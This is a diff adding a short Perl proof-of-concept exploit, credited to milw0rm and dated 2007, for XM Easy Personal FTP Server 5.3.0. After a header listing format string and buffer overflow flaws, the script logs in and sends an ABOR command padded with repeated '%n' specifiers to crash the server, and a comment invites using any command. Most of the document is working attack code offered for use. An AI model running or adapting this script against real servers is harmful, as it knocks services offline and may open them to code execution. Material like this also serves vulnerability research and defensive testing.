@@ -1,0 +1,48 @@
+#!/usr/bin/perl -w
+#=========================================================================================================
+#                XM Easy Personal FTP Server 5.3.0 Multiple vulnerabilities
+#                                   By Umesh Wanve 
+#=========================================================================================================
+#
+# Vendor: http://www.dxm2008.com/
+#
+#  Date: 28-02-2007
+#
+#
+# 1) Multiple format string attacks. Every command is vulnerable.
+#    With only single % also the server crashes.
+# 
+# 2) Multiple buffer overflow occurs in commands if we fuzz the server( Better way use ur own fuzzer)
+#   
+# 
+#    Code execution is possbile. 
+#    This is latest version of FTP server. 
+#
+# ###########################################################################################
+
+use Net::FTP;
+
+(($target = $ARGV[0])) || die "usage:$0 <target> <port>";
+
+my $user = "test";
+my $pass = "test";
+
+
+$exploit_string = "%n" x 10;
+
+
+print ":: Trying to connect to target system at: $target...\n"; 
+
+$ftp = Net::FTP->new($target, Debug => 0, Port => 21) || die "could not connect: $!";
+
+print "Connected!\n";
+
+$ftp->login($user, $pass) || die "could not login: $!"; 
+print "Logged in!\n";
+
+$ftp->command("ABOR ",$exploit_string);                   # Every command is vulnerable. Use it what u like :)
+print "Done!\n";
+
+$ftp->quit; 
+
+# milw0rm.com [2007-02-28]
